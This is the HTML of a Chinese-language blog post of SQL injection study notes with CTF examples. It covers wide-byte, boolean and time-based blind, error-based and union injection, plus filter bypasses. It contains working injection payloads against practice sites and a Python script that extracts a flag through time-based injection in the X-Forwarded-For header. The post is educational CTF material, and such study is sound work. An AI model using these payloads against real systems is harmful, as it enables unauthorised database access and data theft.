@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="咸鱼的学习之旅" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="sql注入学习记录观看视频（安全牛课堂）后的记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入分类及例题">
+<meta property="og:url" content="http://yoursite.com/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/index.html">
+<meta property="og:site_name" content="咸鱼的学习之旅">
+<meta property="og:description" content="sql注入学习记录观看视频（安全牛课堂）后的记录">
+<meta property="og:image" content="e:/360MoveData/Users/yaha/Documents/sql注入题分析/初见宽字节注入/第一次宽字节注入1-1.png">
+<meta property="og:image" content="e:/360MoveData/Users/yaha/Documents/sql注入题分析/初见宽字节注入/宽字节第一次注入2.png">
+<meta property="og:image" content="e:/360MoveData/Users/yaha/Documents/sql注入题分析/初见宽字节注入/第一次宽字节注入3.png">
+<meta property="og:image" content="e:/360MoveData/Users/yaha/Documents/sql注入题分析/初见宽字节注入/第一次宽字节注入4.png">
+<meta property="article:published_time" content="2020-04-12T07:53:17.594Z">
+<meta property="article:modified_time" content="2020-04-12T07:55:38.059Z">
+<meta property="article:author" content="aaro135">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:/360MoveData/Users/yaha/Documents/sql注入题分析/初见宽字节注入/第一次宽字节注入1-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/12/sql注入分类及例题/"/>
+
+
+
+
+
+  <title>sql注入分类及例题 | 咸鱼的学习之旅</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">咸鱼的学习之旅</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">共勉</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="aaro135">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="咸鱼的学习之旅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入分类及例题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-12T15:53:17+08:00">
+                2020-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sql注入学习记录"><a href="#sql注入学习记录" class="headerlink" title="sql注入学习记录"></a>sql注入学习记录</h1><p>观看视频（安全牛课堂）后的记录</p>
+<a id="more"></a>
+<p>###sqlmap支持的注入</p>
+<ul>
+<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>4、联合查询注入，可以使用union的情况下的注入。</li>
+<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+<li>create table user(id int auto_increment,</li>
+<li>username varchar(20) not null,</li>
+<li>password varchar(30) not null,</li>
+<li>create_date DATE,</li>
+<li>PRIMARY KEY(id)</li>
+<li>)DEFAULT CHARSET=utf8;</li>
+</ul>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入是利用MySQL的一个特性，MySQL在使用GBK编码时，会认为两个字符是一个汉字（前一个ascii码大于128，到汉字的范围）</p>
+<p>知道ASCII码表和GBK（《汉字内码扩展规范》，不全）</p>
+<p>URL转码中的转换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格	   %20</span><br><span class="line">&#39;		%27</span><br><span class="line">#		%23</span><br><span class="line">\		%5C</span><br></pre></td></tr></table></figure>
+<p>一、从addslashes中逃逸出来</p>
+<p>需要了解函数<code>string addslashes( string $str )</code>,对某些符号（’、”、\、NULL字符）前加上反斜杠，使得输入的单引号双引号被转义失去在查询语句中的作用。</p>
+<p>1.加入\或者单数个\，使得\’变成<code>\\&#39;</code></p>
+<p>2.把\弄没，如，输如<code>%df&#39;  -&gt;   %df%5C%27</code></p>
+<p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php" target="_blank" rel="noopener">经典例子</a></p>
+<p>这道题就是经典的宽字节注入题，使用了addslashes函数来进行对输入字符的转义。</p>
+<p>可以见到当输入<code>id=1&#39;</code>时，结果是这样的（注意，在hackbar工具中，基本需要对符号进行转码，输入单引号应用%27）</p>
+<p><img src="E:\360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入1-1.png" alt=""></p>
+<p>所以利用上面所学的知识，只要在前面加上任意一个字符的GBK编码就行（大于128，<code>%aa</code>都可以,现在的GBK编码有变化吗？我用%aa不可以了，%df倒是可以），就可以将<code>&#39;</code>释放出来，如图</p>
+<p><img src="E:\360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\宽字节第一次注入2.png" alt=""></p>
+<p>接下来就是常规思路的爆库爆表爆字段爆值(MySQL中information_schema表中含有所有数据库表名列名的信息)。</p>
+<p>先看看有几列,尝试order by 1……..10，看脸，这道题到3报错，而2不报错</p>
+<p><img src="E:\360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入3.png" alt=""></p>
+<p><img src="E:\360MoveData\Users\yaha\Documents\sql注入题分析\初见宽字节注入\第一次宽字节注入4.png" alt=""></p>
+<p>可以看出这道题目是两列</p>
+<p>利用union操作爆库名，看输出列的操作为<code>?id=-1%df%27 union select 1,2 %23</code></p>
+<p>tips:而且我们输入的数字串长度是任意的，输入几个数字，就会出现几个属性，也就是说返回表的列数是等于我们输入的数字个数的，而行数与原数据库表的结构保持一致，原本有3行数据，输入数字串后仍为3行。 </p>
+<p>爆库<code>?id=-1%df%27 union select 1,database() %23</code>,得到库名sae-chinalover </p>
+<p>进行报表名</p>
+<p><code>?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code></p>
+<p>可以得到好多个表名，我们可以随便选择一个表名来进行字段名的爆破，比如选取ctf这个表名构造payload</p>
+<p><code>?id=-1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23</code></p>
+<p>可以看到这里并没有直接用ctf这个单词，以为要是直接输入’ctf’又会遇到前面一样的问题，需要对’进行转义，这里可以将ctf三个字母转换为16进制（hackbar有相应功能），在前面加上0x，MySQL默认认识</p>
+<p>随后得到了两个字段名user 和 pw </p>
+<p>得到字段名了就简单了，直接在ctf表中爆出所有的user和pw就行了</p>
+<p><code>?id=-1%df%27 union select 1,group_concat(pw) from ctf %23</code></p>
+<p>可以看到flag</p>
+<p>同样的，这道题目也可以用sqlmap的形式来进行注入，就是由于宽字节注入的原因，需要加上–hex，否则无法检测到注入</p>
+<h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>不显示结果，但是调整输入会改变输出。</p>
+<p>和时间盲注差不多。</p>
+<p>函数补充mid(str,1,1)</p>
+<p>left(str,length)</p>
+<p>right(str,length)</p>
+<p>例题:<a href='http://106.12.37.37:8080/level2/' target="_blank" rel="noopener">布尔（带审计）</a></p>
+<p>response  = requests.get(url,timeout=5)</p>
+<p>response.content.find(‘xxx’) != -1</p>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>有效果判断，返回结果时间长于设定的秒数</p>
+<p><strong>部分相关函数</strong>:</p>
+<p><strong>1.时延函数：</strong></p>
+<p><strong>sleep(duration):</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">了解一下作用。</span><br><span class="line">select from user where id &#x3D; 1 and sleep(3)；（成功延时）</span><br><span class="line">select from user where id &#x3D; 1 or  sleep(3)；（不成功延迟）</span><br></pre></td></tr></table></figure>
+<p><strong>benchmark(count ,exp)</strong>,多次执行一语句，导致延时benchmark(1000000000000,sha(1));</p>
+<p><strong>笛卡尔积count(*)</strong><code>select count(*) from information_schema.columns A,information_schema.columns B,information_schema.tables C;</code></p>
+<p><strong>GET_LOCK(‘a’,5)</strong>,应用少，需要新开会话。</p>
+<p><strong>repeat/repad函数</strong>进行构造长字符串进行正则匹配pattern的计算量要很大。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</span><br></pre></td></tr></table></figure>
+<p><strong>2.截断函数</strong></p>
+<p><strong>substr()/substring()</strong>函数，<code>select * from user where username = &#39;a&#39; or if (substr((select username from user where id = 1),1,1)=&#39;a&#39;,sleep(3),0);</code></p>
+<p>substr(‘abcde’,1,1);substring(‘abcde’,2);substring(‘abcde’ from 2 for 1);</p>
+<p>截取函数: <strong>substring_index(string,delim,count)</strong>; select substring_index(‘aaaabbbbcccc’,’b’,+-2);</p>
+<p><strong>3.查询函数</strong></p>
+<p><strong>rlike ‘^1’正则匹配   regexp ‘^1’</strong></p>
+<p>配合<strong>IF（expr1，expr2，expr3）</strong>，IF(1,2,3)等于<code>id=1？2:3</code></p>
+<p><code>使用举例：select * from user where id = 1 and if (ascii(substring(database(),1,1))=115,sleep(3),0);</code></p>
+<p><strong>select case when</strong>语句，相当于ifelse。<code>select case when .... then ... else ... end from user;</code></p>
+<p>例题:<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p>
+<p>bugku 的一道题</p>
+<p>附送源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);&#x2F;&#x2F;分割字符串，无法使用逗号</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+<p>由于会将我们的ip地址加入数据库，那么只要在ip地址上下功夫，就可以进行注入。</p>
+<p>使用X-Forwarded-For，可以修改请求头中的ip地址</p>
+<p><code>insert into client_ip (ip) values (&#39;$ip&#39;)</code>这是注入的语句</p>
+<p>基于上面所学的时间注入进行测试</p>
+<p>‘127.0.0.1’ and sleep(3) or ‘1’=’1’</p>
+<p>127.0.0.1’ and sleep(3) or ‘1’=’1</p>
+<p>发现可行</p>
+<p>进行构造payload:<code>127.0.0.1&#39; and (select case when (ascii(substring((select database()) from 1 for 1)))&lt;128 then sleep(10) else &#39;1&#39; end) or &#39;1&#39;=&#39;1</code></p>
+<p>其他东西都能直接爆出来</p>
+<p>接下来编写脚本对值进行爆破:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;</span><br><span class="line">dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@&#123;&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag???-&gt;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for x in dic:</span><br><span class="line">        headers &#x3D; &#123;&quot;X-Forwarded-For&quot;:&quot;127.0.0.1&#39; + (select case when (substring((select flag from flag) from %d for 1))&#x3D; &#39;%s&#39; then sleep(2) else &#39;1&#39; end) or &#39;1&#39;&#x3D;&#39;1&quot; %(i,x)&#125;</span><br><span class="line">        try:</span><br><span class="line">            result &#x3D; requests.get(url,headers &#x3D; headers, timeout&#x3D;2)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag &#x3D; flag + x </span><br><span class="line">            print (flag)</span><br><span class="line">            break</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure>
+<h2 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h2><p>例题的话sqli-labs上也有</p>
+<p>公式网上有很多，可以直接抄来用，最好可以学习了解用法</p>
+<p>公式：<code>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
+<p>rand() 产生一个0~1的随机数。floor向下取整。rand*2时，像下取整得到的值是0或者1。</p>
+<p>如: <code>select count(*) from information_shema.tables group by floor(rand()*2)</code></p>
+<p>此时加入rand（0）必然报错。报不报错和表的数据量和rand中的数据有关。利用产生0/1的随机性。</p>
+<p><code>floor(rand()*2)`</code> </p>
+<p>count(*)先建立虚表,形式如下：</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<p>0</p>
+<p>1</p>
+<p>1</p>
+<p>0</p>
+<p>1</p>
+<p>1</p>
+<table>
+<thead>
+<tr>
+<th>查询计算</th>
+<th>虚表插入计算</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0（此时重复插入0，进行报错）</td>
+</tr>
+</tbody>
+</table>
+<p>常用的：</p>
+<p>updatexml：or updatexml(1,concat(0x7e,(version())),0)(第二个参数应该是Xpath格式的字符串，输入不合格报错，最大长度为32位)</p>
+<p>and extractvalue(1,concat(0x7e),(select database()))</p>
+<p>and exp(~(select * from(select user())a));</p>
+<p>有些报错函数具有局限性，如：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;改为database（）就失去了作用。</p>
+<p>报错注入例题：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">报错注入</a></p>
+<p>点开可以发现，他要我们进行登录，提示我们post username和password</p>
+<p>看源码：<code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p>
+<p>可以先尝试简单的sql注入可不可使用</p>
+<p>输入‘发现出现语法报错<code>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near &#39;44545&#39;&#39;  at line 1</code> </p>
+<p>而当我们进行输入#注释时，却出现了问题<code>Sql injection detected</code>，显示了这么一个东西，那么说明盖对于post的数据，进行了相应的过滤</p>
+<p>可以尝试其他注释的方式，</p>
+<p>题目好像崩了。。</p>
+<p>换sqli-labs 上的例子吧，test5</p>
+<p>通过尝试</p>
+<p>数据库名：~security </p>
+<p>表名有~emails,referers,uagents,users </p>
+<p>列名~USER,CURRENT_CONNECTIONS,TOTAL_ 等等</p>
+<p>太长了不完全显示，可以用limit 1,1来一个个显示</p>
+<p><code>?id=1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name regexp &#39;users&#39; limit 7,1)),0)%23</code></p>
+<p>得到password列，</p>
+<p>用查询语句输出列中数据就可以了</p>
+<p>得到I-kill-you，hhh</p>
+<h2 id="联合注入union"><a href="#联合注入union" class="headerlink" title="联合注入union"></a>联合注入union</h2><ul>
+<li><strong>@@datadir</strong>数据库存储路径</li>
+<li><strong>@@basedir</strong> mysql安装路径</li>
+</ul>
+<p>0’ union select 1,@@datadir,@@basedir%23 </p>
+<h2 id="基于堆查询注入"><a href="#基于堆查询注入" class="headerlink" title="基于堆查询注入"></a>基于堆查询注入</h2><h2 id="基于规则的注入"><a href="#基于规则的注入" class="headerlink" title="基于规则的注入"></a>基于规则的注入</h2><p>比如说注册时候用空格输入过长的用户名，mysql忽略空格，就可以创建管理员账号，好像被修复了？在自己电脑上无法实现。</p>
+<h2 id="检测过滤和绕过过滤的方法"><a href="#检测过滤和绕过过滤的方法" class="headerlink" title="检测过滤和绕过过滤的方法"></a>检测过滤和绕过过滤的方法</h2><p>过滤=</p>
+<p>regexp            !(&lt;&gt;）（&lt;&gt;相当于！=）            like</p>
+<p>过滤# </p>
+<p>两个参数时，使用/**/进行联结。</p>
+<p>–+ 能注释后面的语句</p>
+<p>过滤空格</p>
+<p>%0a换行符</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/10/sqli-labs%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/" rel="next" title="sqli-labs知识点梳理">
+                <i class="fa fa-chevron-left"></i> sqli-labs知识点梳理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">aaro135</p>
+              <p class="site-description motion-element" itemprop="description">学习给我带来不同的生活！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入学习记录"><span class="nav-number">1.</span> <span class="nav-text">sql注入学习记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">1.1.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">1.2.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">1.3.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错注入"><span class="nav-number">1.4.</span> <span class="nav-text">基于报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合注入union"><span class="nav-number">1.5.</span> <span class="nav-text">联合注入union</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于堆查询注入"><span class="nav-number">1.6.</span> <span class="nav-text">基于堆查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于规则的注入"><span class="nav-number">1.7.</span> <span class="nav-text">基于规则的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测过滤和绕过过滤的方法"><span class="nav-number">1.8.</span> <span class="nav-text">检测过滤和绕过过滤的方法</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">aaro135</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
